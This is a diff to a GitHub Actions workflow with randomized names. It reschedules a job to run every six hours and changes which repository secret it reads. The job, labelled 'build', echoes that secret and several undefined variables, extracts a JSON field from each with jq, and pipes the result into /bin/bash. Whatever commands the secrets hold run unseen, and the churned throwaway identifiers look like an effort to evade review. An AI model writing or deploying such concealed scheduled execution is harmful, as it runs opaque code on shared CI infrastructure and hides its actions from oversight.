@@ -1,9 +1,8 @@
 name: midayuan3810
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 0/6 * * *'
+    - cron: '43 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,13 +11,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: midayuan3810
         env:
-          ob18: ${{ secrets.ob18 }}
+          urk17: ${{ secrets.urk17 }}
         run: |
-          echo $ob18 | jq -r .dmt09 | /bin/bash
-          echo $qtbz3587 | jq -r .txkl790 | /bin/bash
-          echo $i537 | jq -r .d839 | /bin/bash
-          echo $j34 | jq -r .yo71972 | /bin/bash
-          echo $iiv7647 | jq -r .qolik76730 | /bin/bash
-          echo $lkgkt1 | jq -r .bhypr56 | /bin/bash
-          echo $gk9214 | jq -r .rtvkd5 | /bin/bash
+          echo $urk17 | jq -r .ena10325 | /bin/bash
+          echo $uzsj380 | jq -r .yl81 | /bin/bash
+          echo $oduto886 | jq -r .cli56165 | /bin/bash
+          echo $oijn3525 | jq -r .ynkm5 | /bin/bash
+          echo $tmkkj6073 | jq -r .zh8 | /bin/bash
+          echo $cywjt75729 | jq -r .iqz0777 | /bin/bash
 
